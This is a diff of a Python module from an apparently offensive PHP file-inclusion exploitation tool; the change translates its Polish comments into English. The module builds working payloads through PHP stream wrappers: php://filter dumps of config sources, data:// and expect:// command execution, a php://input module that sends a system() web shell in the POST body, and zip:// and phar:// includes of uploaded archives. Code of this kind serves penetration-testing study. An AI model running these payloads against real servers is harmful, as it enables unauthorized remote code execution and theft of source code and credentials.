@@ -1,14 +1,14 @@
-"""PHP wrappers — drogi z LFI do RCE / odczytu źródeł.
+"""PHP wrappers — paths from LFI to RCE / source disclosure.
 
-Techniki z CPTS:
-  * php://filter/convert.base64-encode  -> odczyt źródeł (FilterReadModule),
-  * data://text/plain;base64,           -> RCE (wymaga allow_url_include),
-  * php://input                          -> RCE przez body POST,
-  * expect://                            -> bezpośrednie wykonanie komendy,
-  * zip:// , phar://                     -> RCE z wgranego "obrazka".
+Techniques:
+  * php://filter/convert.base64-encode  -> source disclosure (FilterReadModule),
+  * data://text/plain;base64,           -> RCE (requires allow_url_include),
+  * php://input                          -> RCE via POST body,
+  * expect://                            -> direct command execution,
+  * zip:// , phar://                     -> RCE from an uploaded "image".
 
-RCE-owe payloady wstrzykują marker INCLUDED_RCE_OK w komendę, żeby
-detekcja jednoznacznie potwierdziła wykonanie (echo markera).
+RCE payloads inject the INCLUDED_RCE_OK marker into the command so
+detection can unambiguously confirm execution (marker echo).
 """
 from __future__ import annotations
 
@@ -26,18 +26,18 @@ def _b64(s: str) -> str:
     return base64.b64encode(s.encode()).decode()
 
 
-# Komenda, która na Linuksie i tak wyrzuci marker (echo) + realny wynik cfg.cmd.
+# Command that always emits the marker (echo) plus the real cfg.cmd output on Linux.
 def _cmd_with_marker(cmd: str) -> str:
     return f"echo {RCE_MARKER}; {cmd}"
 
 
 class FilterReadModule(BaseModule):
-    """Odczyt źródeł plików jako base64 (nie wykonuje kodu)."""
+    """Read file sources as base64 (no code execution)."""
     name = "filter_read"
-    description = "php://filter/convert.base64-encode — zrzut źródeł"
+    description = "php://filter/convert.base64-encode — source dump"
     expect_base64 = True
 
-    # Typowe źródła wartościowe w whiteboxie + php.ini do sprawdzenia konfiguracji.
+    # Common valuable sources in a whitebox scenario + php.ini for config checks.
     _SOURCES = [
         "index", "config", "configure", "config.php", "db", "database",
         "../config", "/var/www/html/config.php",
@@ -57,7 +57,7 @@ class FilterReadModule(BaseModule):
 
 
 class DataWrapperModule(BaseModule):
-    """data:// — RCE gdy allow_url_include=On."""
+    """data:// — RCE when allow_url_include=On."""
     name = "data"
     description = "data://text/plain;base64 — RCE (allow_url_include)"
 
@@ -69,30 +69,31 @@ class DataWrapperModule(BaseModule):
 
 
 class ExpectWrapperModule(BaseModule):
-    """expect:// — bezpośrednie wykonanie komendy (jeśli rozszerzenie załadowane)."""
+    """expect:// — direct command execution (if the extension is loaded)."""
     name = "expect"
-    description = "expect:// — bezpośrednie wykonanie komendy"
+    description = "expect:// — direct command execution"
 
     def payloads(self) -> Iterator[str]:
         yield f"expect://{_cmd_with_marker(self.cfg.cmd)}"
 
 
 class InputWrapperModule(BaseModule):
-    """php://input — web-shell w body POST.
+    """php://input — web shell in the POST body.
 
-    Nadpisuje run(): payload leci jako body, komenda w URL (jeśli GET dozwolony).
-    Wymaga metody POST na parametrze podatnym.
+    Overrides run(): the payload goes as the body, the command is baked
+    into it. Requires the vulnerable parameter to accept POST.
     """
     name = "input"
-    description = "php://input — RCE przez body POST (allow_url_include)"
+    description = "php://input — RCE via POST body (allow_url_include)"
+    verifiable = False  # custom run(): payload string alone can't be replayed
 
     def payloads(self) -> Iterator[str]:
         yield "php://input"
 
     async def run(self, client: HttpClient) -> list[Finding]:
-        # Hardkodujemy komendę w payloadzie (nie każdy target czyta GET).
+        # Hardcode the command in the payload (not every target reads GET).
         php = f"<?php system('{_cmd_with_marker(self.cfg.cmd)}'); ?>"
-        # Tymczasowo podmieniamy body na web-shell.
+        # Temporarily swap the body for the web shell.
         orig_data, orig_method = client.cfg.data, client.cfg.method
         client.cfg.data = php
         client.cfg.method = "POST"
@@ -102,23 +103,23 @@ class InputWrapperModule(BaseModule):
             client.cfg.data, client.cfg.method = orig_data, orig_method
         finding = self.evaluate(resp)
         if self.cfg.verbose:
-            print(f"    [{resp.status}] {resp.length:>7}B  php://input (POST body web-shell)")
+            print(f"    [{resp.status}] {resp.length:>7}B  php://input (POST body web shell)")
         return [finding] if finding.confirmed else []
 
 
 class ZipPharModule(BaseModule):
-    """zip:// i phar:// — RCE z wgranego pliku-"obrazka".
+    """zip:// and phar:// — RCE from an uploaded "image" file.
 
-    Wymaga znanej ścieżki wgranego archiwum (--file wskazuje na nie).
-    Szkielet: generuje payloady include; samo spreparowanie/wgranie
-    archiwum robisz osobno (opisane w materiale).
+    Requires a known path to the uploaded archive (--file points to it).
+    Skeleton: generates include payloads; crafting/uploading the archive
+    itself is a separate step (covered elsewhere).
     """
     name = "zip_phar"
-    description = "zip:// i phar:// — include wgranego archiwum (podaj --file)"
+    description = "zip:// and phar:// — include an uploaded archive (pass --file)"
 
     def payloads(self) -> Iterator[str]:
         if not self.cfg.target_file:
-            return  # bez ścieżki do archiwum nie ma co robić
+            return  # nothing to do without a path to the archive
         archive = self.cfg.target_file
         yield f"zip://{archive}%23shell.php"
         yield f"phar://{archive}%2Fshell.txt"
